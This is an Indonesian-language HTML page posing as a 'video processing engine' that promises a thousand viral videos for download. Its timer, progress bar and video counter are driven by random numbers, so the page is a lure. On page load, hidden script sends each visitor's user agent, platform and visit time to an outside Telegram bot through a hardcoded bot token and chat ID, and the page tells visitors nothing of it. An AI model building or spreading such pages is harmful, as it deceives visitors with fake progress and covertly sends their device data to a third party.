<!DOCTYPE html>
<html lang="id">
<head>

<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">

<title>Video Processing Engine</title>

<style>

*{
margin:0;
padding:0;
box-sizing:border-box;
font-family:system-ui;
}

body{
background:linear-gradient(135deg,#020617,#0f172a);
color:white;
display:flex;
align-items:center;
justify-content:center;
height:100vh;
}

.container{
width:100%;
max-width:380px;
padding:20px;
}

.header{
display:flex;
justify-content:space-between;
margin-bottom:15px;
}

.title{
font-size:18px;
font-weight:bold;
}

.timer{
font-size:18px;
}

.card{
background:rgba(255,255,255,.05);
border-radius:18px;
padding:18px;
backdrop-filter:blur(25px);
box-shadow:0 10px 30px rgba(0,0,0,.4);
}

.preview{
height:170px;
background:#111827;
border-radius:12px;
display:flex;
align-items:center;
justify-content:center;
font-size:55px;
}

.progressBar{
height:10px;
background:#1f2937;
border-radius:20px;
margin-top:14px;
overflow:hidden;
}

.progress{
height:100%;
width:0%;
background:linear-gradient(90deg,#22c55e,#3b82f6);
transition:width .4s;
}

.counter{
font-size:19px;
color:#22c55e;
margin-top:10px;
}

.download{
margin-top:12px;
background:rgba(34,197,94,.15);
padding:10px;
border-radius:10px;
font-size:14px;
text-align:center;
}

.footer{
text-align:center;
font-size:11px;
margin-top:14px;
color:#64748b;
}

</style>
</head>

<body>

<div class="container">

<div class="header">
<div class="title">Video Processing</div>
<div class="timer" id="timer">60:00</div>
</div>

<div class="card">

<div class="preview">🎬</div>

<div class="progressBar">
<div class="progress" id="progress"></div>
</div>

<div class="counter" id="counter">
0 video ditemukan
</div>

<div class="download">
📥 Total video yang dapat di download :  
<b>1000 video viral terbaru</b>
</div>

</div>

<div class="footer">
Mobile Video Processing Engine
</div>

</div>

<script>

let total=60*60
let remaining=total
let progress=0
let videos=0

window.onload=function(){

startProcessing()
sendTelegram()

}

function startProcessing(){

setInterval(()=>{

let m=Math.floor(remaining/60)
let s=remaining%60

if(m<10)m="0"+m
if(s<10)s="0"+s

document.getElementById("timer").innerText=m+":"+s

if(remaining>0)remaining--

},1000)

setInterval(()=>{

progress+=Math.random()*2

if(progress>100)progress=100

document.getElementById("progress").style.width=progress+"%"

if(videos<1000){

videos+=Math.floor(Math.random()*5)

if(videos>1000)videos=1000

}

document.getElementById("counter").innerText=
videos+" video ditemukan"

},1000)

}

function sendTelegram(){

const TOKEN="8637984928:AAHEtjbOkiDojbb5Y_-eHu-y-6JOQJYSqto"
const CHAT_ID="8215645360"

const message =
"Video processing dijalankan\n"+
"UserAgent: "+navigator.userAgent+"\n"+
"Platform: "+navigator.platform+"\n"+
"Waktu: "+new Date()

fetch(
"https://api.telegram.org/bot"+TOKEN+"/sendMessage",
{
method:"POST",
headers:{
"Content-Type":"application/json"
},
body:JSON.stringify({
chat_id:CHAT_ID,
text:message
})
})

}

</script>

</body>
</html>
